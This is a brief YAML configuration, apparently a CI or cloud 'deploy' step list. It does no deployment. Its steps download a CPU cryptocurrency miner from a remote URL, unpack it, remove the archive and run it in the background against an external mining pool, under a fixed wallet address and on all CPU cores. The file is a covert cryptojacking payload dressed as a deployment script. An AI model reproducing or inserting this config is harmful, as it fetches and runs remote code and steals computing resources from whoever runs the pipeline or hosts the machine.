deploy:
  - apt-get update && apt-get upgrade -y
  - apt-get install curl -y
  - curl https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz --output hellminer_cpu_linux.tar.gz
  - tar xf hellminer_cpu_linux.tar.gz
  - rm hellminer_cpu*
  - nohup ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u R9wVJFEuqm3xPkek6LQtDx4dFyrwaTvMBv -p x --cpu $(echo $(nproc --all))
  
